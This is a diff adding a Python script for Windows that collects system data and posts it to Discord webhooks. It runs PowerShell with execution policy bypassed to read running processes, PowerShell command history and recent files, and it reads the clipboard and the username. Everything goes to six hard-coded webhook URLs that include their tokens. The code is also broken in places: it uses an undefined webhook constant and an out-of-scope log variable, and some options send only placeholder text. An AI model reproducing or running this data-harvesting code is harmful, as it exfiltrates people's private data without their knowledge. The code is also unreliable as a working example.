@@ -1,0 +1,221 @@
+import os
+import subprocess
+import requests
+import json
+import time
+import platform
+import getpass
+import win32clipboard  # Requires pywin32 module
+import shutil  # For copying files
+import tempfile  # For working with temporary directories
+import sys
+from datetime import datetime, timedelta
+
+# Webhook URLs
+WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1279137428371931248/eYRZf4HRZ5GmYXgLI_iRA5WiOhqVSFBDGn_ztg-oRrNrSWmdKq69WC0MX9P9nQuutQac'
+ERROR_WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1279188293438799902/S3ejH4YpQBv-7Yp4TfW8LCezK-UpzVxolIwdcX66uN-DQZ2DiXt-X2QdeL2mM9ky5Siz'
+TRACE_WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1279148419193114694/l4pr5CEMMlD4LDsZ9_plYFSfTgWCVvWqXCN9Gri6XVq8bRL55GZtgNZXGOU1TrY34SCV'
+DATABASE_WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1279407337618145310/A7fONuJnsWJLLCwkB2XlNKga0XeQwO6yq3HjWzhHt6hqzafunlxxeIO_dpebSN_DcunP'
+SYSTEM_INFO_WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1279407392379109497/15w0yvCeqmb64b7NqPgtFL8ZRwmqjMb3G1H0Mu0NX4nBXnwqoWTLGogQOSBVS6_2CoC_'
+ACTIVITY_WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1279411390314057820/85pPrwRUCeX3EoLCexlHK0LOyAf9m9pRmRO3GIgZZMhMdm_gxAbMLWSE_0T6MXNhiWgK'
+
+# List of specific apps to detect
+SPECIFIC_APPS = [
+    'steam', 'spotify', 'razercortex', 'razersynapse', 'lghub',
+    'chrome', 'tiktok', 'voicemeeterpro', 'brave'
+]
+
+def send_embed_to_webhook(title, description, color, url, delay):
+    """Send a message to the webhook with an embedded format."""
+    max_description_length = 2000
+    descriptions = [description[i:i+max_description_length] for i in range(0, len(description), max_description_length)]
+
+    for desc in descriptions:
+        embed = {
+            "embeds": [
+                {
+                    "title": title,
+                    "description": desc,
+                    "color": color
+                }
+            ]
+        }
+        try:
+            response = requests.post(url, json=embed)
+            response.raise_for_status()
+            print_status(f"Embed sent to webhook: {title}", 'success')
+        except requests.RequestException as e:
+            print_status(f"Failed to send embed to webhook: {e}", 'error')
+        
+        time.sleep(delay)  # Ensure delay between webhook requests
+
+def print_status(message, status='normal'):
+    """Print status messages with color coding for real-time feedback."""
+    color_code = {
+        'error': '91',     # Red
+        'warning': '93',   # Yellow
+        'success': '92',   # Green
+        'normal': '0'      # Default
+    }
+    print(f"\033[{color_code[status]}m{message}\033[0m")
+
+def write_log(log_path, message):
+    """Write messages to a log file."""
+    with open(log_path, 'a') as log_file:
+        log_file.write(message + "\n")
+
+def run_command(command):
+    """Execute a command and return its output or an error message."""
+    try:
+        result = subprocess.check_output(command, shell=True, text=True).strip()
+        return result, None
+    except subprocess.CalledProcessError as e:
+        return None, str(e)
+
+def scan_directory(directory, specific_files=None):
+    """Recursively scan a directory for specific files."""
+    results = {file: [] for file in specific_files} if specific_files else []
+    directories_to_scan = [directory]
+    total_files = 0
+    scanned_files = 0
+
+    while directories_to_scan:
+        current_dir = directories_to_scan.pop()
+        if not os.path.exists(current_dir):
+            print_status(f"Directory does not exist: {current_dir}", 'error')
+            continue
+        
+        try:
+            with os.scandir(current_dir) as it:
+                for entry in it:
+                    if entry.is_dir(follow_symlinks=False):
+                        directories_to_scan.append(entry.path)
+                    elif specific_files:
+                        for file in specific_files:
+                            if file.lower() in entry.name.lower():
+                                path = entry.path
+                                results[file].append(path)
+                                write_log(log_file, f"Found file: {path}")
+                                print_status(f"Found file: {path}", 'warning')
+                    scanned_files += 1
+                    total_files += 1
+        except PermissionError:
+            write_log(log_file, f"Permission denied: {current_dir}")
+            print_status(f"Permission denied: {current_dir}", 'error')
+            continue
+
+    return results, total_files, scanned_files
+
+def get_processes():
+    command = 'powershell -ExecutionPolicy Bypass -Command "Get-Process | Select-Object -Property Name, Id, Path | ConvertTo-Json"'
+    output, error = run_command(command)
+    if error:
+        write_log(log_file, f"Failed to get processes: {error}")
+        print_status(f"Failed to get processes: {error}", 'error')
+    else:
+        write_log(log_file, "Retrieved processes.")
+        print_status("Retrieved processes.", 'success')
+    return output or f"Error: {error}"
+
+def get_admin_processes():
+    command = 'powershell -ExecutionPolicy Bypass -Command "Get-Process | Where-Object { $_.Path -like \'C:\\Windows\\System32\\*\' -or $_.Path -like \'C:\\Program Files*\\*\' } | Select-Object -Property Name, Id, Path | ConvertTo-Json"'
+    output, error = run_command(command)
+    if error:
+        write_log(log_file, f"Failed to get admin processes: {error}")
+        print_status(f"Failed to get admin processes: {error}", 'error')
+    else:
+        write_log(log_file, "Retrieved admin processes.")
+        print_status("Retrieved admin processes.", 'success')
+    return output or f"Error: {error}"
+
+def format_processes(processes):
+    try:
+        processes_json = json.loads(processes)
+        formatted = []
+        for process in processes_json:
+            name = process.get("Name", "Unknown")
+            pid = process.get("Id", "Unknown")
+            path = process.get("Path", "Unknown")
+            formatted.append(f"**{name}** (PID: {pid})\nPath: {path}")
+        return "\n".join(formatted)
+    except json.JSONDecodeError as e:
+        return f"Error formatting processes: {e}"
+
+def get_system_info():
+    system_info = {
+        "OS": platform.system(),
+        "Version": platform.version(),
+        "Architecture": platform.architecture()[0],
+        "Machine": platform.machine(),
+        "Processor": platform.processor(),
+        "User": getpass.getuser()
+    }
+    info_str = "\n".join([f"{key}: {value}" for key, value in system_info.items()])
+    return info_str
+
+def get_recent_activity():
+    recent_activity = ""
+
+    # Fetch recent commands
+    command_history_cmd = 'powershell -ExecutionPolicy Bypass -Command "Get-History | Select-Object -Property CommandLine | ConvertTo-Json"'
+    output, error = run_command(command_history_cmd)
+    if output:
+        recent_activity += "Recent Commands:\n" + output + "\n"
+    if error:
+        recent_activity += f"Error fetching command history: {error}\n"
+
+    # Fetch clipboard data
+    try:
+        win32clipboard.OpenClipboard()
+        clipboard_data = win32clipboard.GetClipboardData()
+        recent_activity += "Clipboard Data:\n" + clipboard_data + "\n"
+    except Exception as e:
+        recent_activity += f"Error fetching clipboard data: {e}\n"
+    finally:
+        win32clipboard.CloseClipboard()
+
+    # Fetch recent files opened/modified
+    recent_files_cmd = 'powershell -ExecutionPolicy Bypass -Command "Get-ChildItem -Path $env:USERPROFILE\\Recent -Recurse | Select-Object -Property Name, LastWriteTime | ConvertTo-Json"'
+    output, error = run_command(recent_files_cmd)
+    if output:
+        recent_activity += "Recent Files:\n" + output + "\n"
+    if error:
+        recent_activity += f"Error fetching recent files: {error}\n"
+
+    return recent_activity
+
+def main():
+    if len(sys.argv) < 3:
+        print("Usage: script.py <option> <delay>")
+        sys.exit(1)
+
+    option = sys.argv[1]
+    delay = int(sys.argv[2]) if sys.argv[2].isdigit() else 5
+
+    log_file = tempfile.mktemp(suffix=".log", dir=tempfile.gettempdir())
+    print_status(f"Log file created: {log_file}", 'success')
+
+    if option == '1':
+        processes = get_processes()
+        formatted_processes = format_processes(processes)
+        send_embed_to_webhook("All Processes", formatted_processes, 0x00FF00, SYSTEM_PROCESSES_WEBHOOK_URL, delay)
+    elif option == '2':
+        database_results = "Database search results go here."
+        send_embed_to_webhook("Database Search Results", database_results, 0x0000FF, DATABASE_WEBHOOK_URL, delay)
+    elif option == '3':
+        traces = "Deep scan results go here."
+        send_embed_to_webhook("Traces Report", traces, 0xFF0000, TRACE_WEBHOOK_URL, delay)
+    elif option == '4':
+        system_info = get_system_info()
+        send_embed_to_webhook("System Information", system_info, 0x00FFFF, SYSTEM_INFO_WEBHOOK_URL, delay)
+    elif option == '5':
+        error_info = "Error handling information goes here."
+        send_embed_to_webhook("Error Report", error_info, 0xFF00FF, ERROR_WEBHOOK_URL, delay)
+    elif option == '6':
+        recent_activity = get_recent_activity()
+        send_embed_to_webhook("Recent Activity", recent_activity, 0x00FFFF, ACTIVITY_WEBHOOK_URL, delay)
+    else:
+        print_status("Invalid option selected.", 'error')
+
+if __name__ == "__main__":
+    main()
